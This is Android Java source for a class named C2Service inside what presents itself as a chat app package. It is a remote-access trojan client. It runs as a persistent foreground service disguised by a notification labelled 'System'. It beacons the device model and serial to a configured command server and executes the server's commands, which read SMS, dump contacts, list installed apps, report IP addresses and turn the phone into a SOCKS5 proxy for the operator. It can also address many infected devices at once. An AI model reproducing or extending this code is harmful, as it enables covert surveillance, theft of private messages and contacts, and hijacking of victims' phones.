package com.meetin.chat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import java.io.*;
import java.net.Socket;

public class C2Service extends Service {
    private static final String CHANNEL_ID = "C2Channel";
    private static final int NOTIF_ID = 1;
    private Socket socket;
    private PrintWriter writer;
    private BufferedReader reader;
    private volatile boolean running = true;
    private String deviceId;
    private ProxyService proxyService;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        deviceId = Build.MODEL.replace(" ", "_") + "|" + Build.SERIAL;
        proxyService = new ProxyService();
        proxyService.onCreate();
        Log.d("C2Service", "Service Created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("C2Service", "Service Starting...");
        startForeground(NOTIF_ID, createNotification());
        new Thread(this::connectAndServe).start();
        return START_STICKY;
    }

    private void connectAndServe() {
        while (running) {
            try {
                Log.d("C2Service", "Connecting to " + Config.HOST + ":" + Config.PORT);
                socket = new Socket(Config.HOST, Config.PORT);
                writer = new PrintWriter(socket.getOutputStream(), true);
                reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                // Pass the socket to ProxyService
                proxyService.setC2Socket(socket);

                writer.println("DEVICE:" + deviceId);
                writer.println("READY");
                Log.d("C2Service", "Connected!");

                String command;
                while ((command = reader.readLine()) != null && running) {
                    Log.d("C2Service", "Command: " + command);
                    String response = executeCommand(command);
                    writer.println(response);
                    writer.println("---END---");
                }
            } catch (Exception e) {
                Log.e("C2Service", "Connection error: " + e.getMessage());
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    private String executeCommand(String command) {
        if (command.startsWith("@")) {
            String[] parts = command.split(":", 2);
            if (parts.length < 2) return "Invalid target";
            String target = parts[0].substring(1);
            String cmd = parts[1];
            if (target.equals("all") || target.equals(deviceId) || target.equals(Build.MODEL)) {
                return executeCmd(cmd);
            }
            return "Ignored";
        }
        return executeCmd(command);
    }

    private String executeCmd(String cmd) {
        // PROXY COMMANDS
        if (cmd.equalsIgnoreCase("proxy on")) {
            proxyService.startProxy();
            return "✅ SOCKS5 proxy started on port 1080\n✅ Traffic routed through C2 tunnel";
        }
        if (cmd.equalsIgnoreCase("proxy off")) {
            proxyService.stopProxy();
            return "❌ Proxy stopped";
        }
        if (cmd.equalsIgnoreCase("proxy status")) {
            return proxyService.isRunning() ? "✅ Proxy running on port 1080" : "❌ Proxy stopped";
        }

        // IP COMMANDS
        if (cmd.equalsIgnoreCase("ip")) {
            return DeviceInfo.getFullIpInfo(this);
        }
        if (cmd.equalsIgnoreCase("localip")) {
            return "Local IP: " + DeviceInfo.getDeviceIp();
        }
        if (cmd.equalsIgnoreCase("publicip")) {
            return "External IP: " + DeviceInfo.getPublicIp();
        }

        // EXISTING COMMANDS
        if (cmd.equalsIgnoreCase("ping")) return "PONG";
        if (cmd.equalsIgnoreCase("info")) return DeviceInfo.getInfo(this);
        if (cmd.equalsIgnoreCase("sms read")) return DeviceInfo.readSms(this);
        if (cmd.equalsIgnoreCase("apps list")) return DeviceInfo.getApps(this);
        if (cmd.equalsIgnoreCase("contacts")) return DeviceInfo.getContacts(this);
        if (cmd.equalsIgnoreCase("device")) return deviceId;
        if (cmd.equalsIgnoreCase("exit")) { running = false; stopSelf(); return "EXIT"; }

        return "Unknown command. Available: ping, info, ip, localip, publicip, sms read, contacts, apps list, device, proxy on/off/status, exit";
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        running = false;
        if (proxyService != null) proxyService.stopProxy();
        try { socket.close(); } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
